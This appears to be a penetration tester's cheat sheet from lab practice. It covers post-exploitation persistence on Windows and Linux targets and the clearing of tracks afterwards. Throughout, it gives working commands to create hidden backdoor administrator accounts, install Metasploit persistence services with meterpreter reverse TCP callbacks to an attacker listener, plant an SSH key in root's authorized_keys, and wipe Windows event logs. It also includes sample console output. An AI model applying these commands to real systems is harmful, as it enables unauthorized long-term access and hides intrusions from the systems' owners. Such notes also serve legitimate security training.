

### [PERSISTENCE](#)

###### Persistence by RDP (GUI based access) or WinRM (CLI based access)
- Requirements: We need either RDP (3389) or Winrm (5985) port open on target

    - First we create the account itself
        - `net user USERNAME PASSWORD /add`

    - Next we add our newly created account in the "Administrators" and "Remote Management Users" groups
        - `net localgroup Administrators USERNAME /add`
        - `net localgroup "Remote Management Users" USERNAME /add`

    - We can now check user details once

    - we can now winrm or rdp into machine
        - `evil-winrm -i '10.200.141.150' -u 'sam' -p 'Cayde@123'`
        

- Establish Persistence using metasploit module
    - `use exploit/windows/local/persistence_service` > `set payload windows/meterpreter/reverse_tcp` > `set SESSION 1` > `run`
    - Get back access to target by specifying same LHOST and LPORT
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LHOST 10.10.12.2` > `exploit`

- Establish Persistence by Enabling RDP by metasploit module
    - `use windows/manage/enable_rdp` > ` set SESSION 1` > `exploit`
        - we need to get access to RDP, for wchich we require credentials
            - we can change user password (not recommended)
                - `shell` > `net user Administrator password_123`
                - `xfreerdp /u:administrator /p:password_123 /v:10.5.28.9`
            - we will create a New backdoor user Account and we have the permission to do so as we are administrator, We will then also hider user from windows login screen, we then add the user to gruops Remote Desktop Users and Administrators
                - We can do all of this by a meterpreter command `getgui`
                - `run getgui -e -u user123 -p hacker_123321`


###### Persistence by Adding SSH Public key

1. Generate public and private keys using `ssh-keygen` on attacker machine
```
# it will ask you for passphrase, This will create both id_rsa and id_rsa.pub in ~/.ssh directory
ssh-keygen -t rsa -b 4096 
```
2. Copy the content in "id_rsa.pub" 
3. Now on target machine If the .ssh directory and authorized_keys file don’t exist, you will need to create them, this can be done by running the following commands
```
mkdir ~/.ssh
touch ~/.ssh/authorized_keys
```
4. Paste the contents of the public key you generated into the authorized_keys file.
5. It is also recommended to apply the necessary permissions to the .ssh directory and authorized_keys file, this can be done by running the following commands
```
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
 ```
6. you will now be able to authenticate to the target via SSH without providing a password
```
ssh -i id_rsa root@10.10.11.136
```


### [CLEARING TRACKS](#)

**Clearing artifacts using metasploit `Resource Scripts`**
```
msf6 exploit(windows/local/persistence_service) > `run`
[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vgdjb.exe
[*] Creating service spMjX
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc
[*] Sending stage (175174 bytes) to 10.5.31.225
[*] Meterpreter session 2 opened (10.10.26.2:4444 -> 10.5.31.225:49743) at 2024-01-15 17:34:43 +0530  
```
- We can delete the artificats created by metasploit module by Resource Scripts provided by it
    - `resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc`

**Clearing Windows Event Logs usng meterpreter**
- `clearev`